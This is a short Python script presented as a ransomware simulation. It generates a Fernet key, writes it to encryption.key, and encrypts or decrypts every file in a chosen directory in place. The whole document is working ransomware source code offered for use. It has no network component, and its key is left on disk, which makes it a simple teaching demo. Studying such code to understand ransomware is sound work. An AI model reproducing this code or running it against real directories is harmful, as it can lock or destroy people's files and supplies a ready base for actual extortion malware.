#!/usr/bin/env python3

'''
This is a ransomware example that encrypts and decrypts all the files within a directory.

To test it out, you can create a few .txt files in directory, for example using: echo "Super secret document" > secret.txt

After that in order to
Encrypt: python3 ransomware.py -e /path/to/directory
Decrypt: python3 ransomware.py -d /path/to/directory

encryption.key file will be created in your /path/to/directory which will be used for encryption/decryption.

Credits to https://www.youtube.com/c/NetworkChuck

Evgeni Semenov, hello@safemail.sbs
'''

import os, argparse
from cryptography.fernet import Fernet

def get_arguments():
    parser = argparse.ArgumentParser(description="This program is a ransomware simulation. It can encrypt and decrypt all files within a specified directory.")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-e", "--encrypt", help="Encrypts all files in the specified directory.", action="store_true")
    group.add_argument("-d", "--decrypt", help="Decrypts all files in the specified directory.", action="store_true")
    parser.add_argument("path", type=dir_path, help="Specify a directory where the files are located.")

    args = parser.parse_args()
    return args

def dir_path(path): #checking the path of directory
    if os.path.isdir(path):
        return path
    else:
        raise argparse.ArgumentTypeError(f"[-] readable_dir:{path} is not a valid directory path")

def get_files(path):
    files = [] #creating an empty list of files
    os.chdir(path)

    for file in os.listdir():
        if file == "ransomware.py" or file == "encryption.key": #excluding files in case if you run the program in the same directory
            continue
        if os.path.isfile(file):
            files.append(file)
    return files

def encrypt_files(files):
    print("[+] Encrypting all files in "+args.path)
    key = Fernet.generate_key() #generating encryption key

    with open ("encryption.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
    print ("... Done!")

def decrypt_files(files):
    print("[+] Decrypting all files in "+args.path)
    with open("encryption.key", "rb") as key:
        secretkey = key.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)

        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print ("... Done!")

if __name__ == "__main__":
    args = get_arguments()
    files = get_files(args.path)

    if args.encrypt:
        encrypt_files(files)
    if args.decrypt:
        decrypt_files(files)
